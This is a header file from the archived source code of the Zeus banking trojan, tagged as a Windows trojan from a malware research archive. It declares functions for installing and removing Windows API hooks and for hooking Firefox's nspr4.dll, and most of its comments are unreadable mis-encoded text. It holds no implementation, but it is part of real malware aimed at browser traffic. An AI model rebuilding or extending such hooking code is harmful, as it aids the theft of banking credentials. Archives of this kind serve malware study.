/*
  name      Zeus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  ������� ��������� WinAPI.

  ������ ������ ����������� Core, � �� ����� ����� ���� ����� �� ��������� ����������.
  �� ������������ ����������� unhook �� ��������.
*/
#pragma once

namespace WinApiTables
{
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ��������� ��� �������� ������������. 

    Return - true - � ������ ������,
             false - � ������ ������.
  */
  bool _setUserHooks(void);

  /*
    ������ ����� ��� �������� ������������.

    Return - true - � ������ ������,
             false - � ������ ������.
  */
  bool _removeUserHooks(void);

  /*
    ������� ���������� �������� ��� nspr4.dll. 

    Return - true - � ������ ������,
             false - � ������ ������.
  */
#if(BO_NSPR4 > 0)
  bool _trySetNspr4Hooks(void);
#endif

  /*
    ������� ���������� �������� ��� nspr4.dll. 

    IN moduleName   - ������ ��� ��������������� ������.
    IN moduleHandle - ����� ��������������� ������.
    
    Return          - true - � ������ ������,
                      false - � ������ ������.
  */
#if(BO_NSPR4 > 0)
  bool _trySetNspr4HooksEx(LPWSTR moduleName, HMODULE moduleHandle);
#endif

  /*    Installation for nspr4.dll.

    IN nspr4Handle - handle nspr4.dll.
    
    Return - true - if successful,
                     false - if an error occurs.
  */
#if(BO_NSPR4 > 0)
  bool _setNspr4Hooks(HMODULE nspr4Handle);
#endif
};
